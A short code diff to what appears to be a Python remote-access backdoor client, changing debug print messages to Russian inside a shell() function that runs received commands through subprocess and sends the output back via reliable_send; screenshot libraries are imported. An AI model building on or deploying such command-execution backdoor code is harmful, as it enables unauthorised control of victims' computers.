@@ -25,7 +25,6 @@ import struct
 import pyautogui
 from PIL import Image
 
-
 # Отправить ответ
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -210,9 +209,9 @@ def shell():
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
-                print('try 2')
+                print('Вхожу в alarm')
                 result = execute.stdout.read() + execute.stderr.read()
-                print('try 3' + result)
+                print('Вышел из alarm успешно' + result)
                 result = result.decode()
                 print('Ok, recive' + result)
                 reliable_send(result)
